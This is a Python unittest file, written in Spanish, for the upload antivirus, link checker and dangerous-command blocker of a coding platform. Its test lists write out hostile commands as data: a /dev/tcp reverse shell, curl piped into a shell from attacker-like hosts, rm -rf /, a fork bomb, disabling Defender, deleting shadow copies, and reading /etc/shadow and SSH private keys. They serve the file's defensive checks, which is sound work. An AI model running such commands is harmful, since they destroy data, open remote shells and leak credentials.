"""Seguridad: antivirus de subidas, detector de enlaces peligrosos y comandos bloqueados del Conector."""
import io
import os
import tempfile
import unittest
import zipfile

from servicios.antivirus import EICAR, revisar_archivo, revisar_nombre
from servicios.comandos_peligrosos import revisar_comando
from servicios.seguridad_enlaces import revisar_enlace


def _archivo(datos):
    f = tempfile.NamedTemporaryFile(delete=False)
    f.write(datos); f.close()
    return f.name


class AntivirusTest(unittest.TestCase):
    def tearDown(self):
        for r in getattr(self, "rutas", []):
            os.unlink(r)

    def revisar(self, datos, nombre):
        self.rutas = getattr(self, "rutas", []) + [_archivo(datos)]
        return revisar_archivo(self.rutas[-1], nombre)

    def test_bloquea_ejecutables_aunque_cambien_la_extension(self):
        self.assertIsNotNone(self.revisar(b"MZ\x90\x00" + b"\x00" * 200, "tarea.pdf"))
        self.assertIsNotNone(self.revisar(b"\x7fELF\x02\x01" + b"\x00" * 100, "foto.png"))

    def test_firma_de_prueba_eicar(self):
        self.assertIn("virus", self.revisar(EICAR, "nota.txt"))

    def test_extensiones_y_macros(self):
        self.assertIsNotNone(revisar_nombre("juego.exe"))
        self.assertIsNotNone(revisar_nombre("notas.docm"))
        self.assertIsNotNone(revisar_nombre("foto.jpg.js"))
        self.assertIsNone(revisar_nombre("main.py"))
        self.assertIsNone(revisar_nombre("jquery.min.js"))

    def test_zip_con_programa_adentro(self):
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w") as z:
            z.writestr("proyecto/main.py", "print(1)")
            z.writestr("proyecto/regalo.exe", b"MZ" + b"\x00" * 50)
        self.assertIn("regalo.exe", self.revisar(b.getvalue(), "proyecto.zip"))

    def test_archivos_normales_pasan(self):
        self.assertIsNone(self.revisar(b"\x89PNG\r\n\x1a\n" + b"\x00" * 100, "foto.png"))
        self.assertIsNone(self.revisar(b"print('hola')\n", "main.py"))
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w") as z:
            z.writestr("index.html", "<h1>hola</h1>")
        self.assertIsNone(self.revisar(b.getvalue(), "web.zip"))


class EnlacesTest(unittest.TestCase):
    def nivel(self, url):
        return revisar_enlace(url, consultar_externos=False)["nivel"]

    def test_sitios_normales(self):
        for u in ["https://github.com/ana/app", "https://docs.python.org/3/", "https://www.youtube.com/watch?v=x", "https://pineapple.com", "https://senado.gov.co"]:
            self.assertEqual(self.nivel(u), "seguro", u)

    def test_estafas_bloqueadas(self):
        for u in ["https://g00gle.com", "https://paypa1.com", "https://bancolombia-seguro.top", "https://google.com@estafa.xyz",
                  "javascript:alert(1)", "http://45.1.2.3/setup.exe", "https://www.раураl.com", "https://githb.com/login",
                  "https://testsafebrowsing.appspot.com/s/malware.html"]:
            self.assertEqual(self.nivel(u), "bloqueado", u)

    def test_dudosos_avisan(self):
        self.assertEqual(self.nivel("https://bit.ly/x"), "advertencia")
        self.assertEqual(self.nivel("https://releases.example.com/instalador.exe"), "advertencia")


class ComandosTest(unittest.TestCase):
    def test_peligrosos(self):
        for c in ["rm -rf /", "rm -rf ~", "format C:", "shutdown -h now", ":(){ :|:& };:", "Set-MpPreference -DisableRealtimeMonitoring $true",
                  "vssadmin delete shadows /all", "cat /etc/shadow", "bash -i >& /dev/tcp/1.2.3.4/9 0>&1", "curl http://x.top/a.sh | sh"]:
            self.assertIsNotNone(revisar_comando(c), c)

    def test_normales(self):
        for c in ["python main.py", "npm install", "rm -rf node_modules", "git push", "curl https://sh.rustup.rs -sSf | sh", "rd /s /q build", "flutter run"]:
            self.assertIsNone(revisar_comando(c), c)


if __name__ == "__main__":
    unittest.main()


class AntivirusEquilibradoTest(unittest.TestCase):
    """Muy seguro, pero sin bloquear lo normal de un proyecto."""

    def _zip(self, entradas):
        import io, tempfile, zipfile
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w") as z:
            for n, d in entradas:
                z.writestr(n, d)
        f = tempfile.NamedTemporaryFile(delete=False, suffix=".zip")
        f.write(b.getvalue()); f.close()
        return f.name

    def test_proyectos_compilados_si_virus_no(self):
        from servicios.antivirus import EICAR, revisar_archivo
        self.assertIsNone(revisar_archivo(self._zip([("App/bin/Debug/App.exe", b"MZ" + b"\0" * 60), ("App/bin/Debug/App.dll", b"MZ" + b"\0" * 60)]), "p.zip"))
        self.assertIsNone(revisar_archivo(self._zip([("build/app", b"\x7fELF" + b"\0" * 60)]), "p.zip"))
        self.assertIsNotNone(revisar_archivo(self._zip([("instalar.exe", b"MZ" + b"\0" * 60)]), "p.zip"))
        self.assertIsNotNone(revisar_archivo(self._zip([("bin/x.exe", b"MZ" + EICAR)]), "p.zip"))
        self.assertIsNotNone(revisar_archivo(self._zip([("bin/a.lnk", b"L")]), "p.zip"))

    def test_comandos(self):
        from servicios.comandos_peligrosos import revisar_comando as r
        for bueno in ("rm -rf node_modules", "iwr https://get.scoop.sh -useb | iex", "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -",
                      "chmod -R 755 ./public", "git clean -fdx", "cat ~/.ssh/id_ed25519.pub"):
            self.assertIsNone(r(bueno), bueno)
        for malo in ("curl http://malo.xyz/x | sudo -E bash", "curl http://malo.xyz/x.py | python3", "rm -rf ~", "cat ~/.ssh/id_rsa"):
            self.assertIsNotNone(r(malo), malo)

    def test_enlaces(self):
        from servicios.seguridad_enlaces import revisar_enlace as r
        for bueno in ("https://github.com/a/b", "http://localhost:5173/", "https://mi-app.vercel.app", "https://soporte.microsoft.com", "https://www.freecodecamp.org/"):
            self.assertEqual(r(bueno, consultar_externos=False)["nivel"], "seguro", bueno)
        for malo in ("https://login-microsoftonline.com.evil.ru/", "https://free-robux-generator.tk", "javascript:alert(1)", "https://g00gle.com"):
            self.assertEqual(r(malo, consultar_externos=False)["nivel"], "bloqueado", malo)


class CarpetasDelSistemaTest(unittest.TestCase):
    """Con el Conector, CódigoCamp solo frena comandos destructivos y la entrada a carpetas del sistema."""
    def test_bloquea_system32_y_carpetas_del_sistema(self):
        from servicios.comandos_peligrosos import revisar_comando as r
        for c in ["del /s /q C:\\Windows\\System32", "rd /s /q C:\\Windows", "cd C:\\Windows\\System32", "cd %SystemRoot%",
                  "copy x.dll C:\\Windows\\System32", "echo 1 > C:\\Windows\\System32\\drivers\\etc\\hosts", "explorer C:\\Windows\\System32",
                  "rm /etc/passwd", "sudo mv x /bin/ls", "sudo chmod 777 /etc/sudoers", "rm -rf /boot/grub"]:
            self.assertTrue(r(c), c)

    def test_no_molesta_el_trabajo_normal(self):
        from servicios.comandos_peligrosos import revisar_comando as r
        for c in ["cd C:\\Users\\Cris\\proyectos", "rm -rf node_modules", "cat /etc/hosts", "ls /usr/bin", "cd /etc", "npm install",
                  "copy a.txt b.txt", "cd windows-app", "mv src/a.js src/b.js", "chmod +x run.sh", "python main.py"]:
            self.assertIsNone(r(c), c)
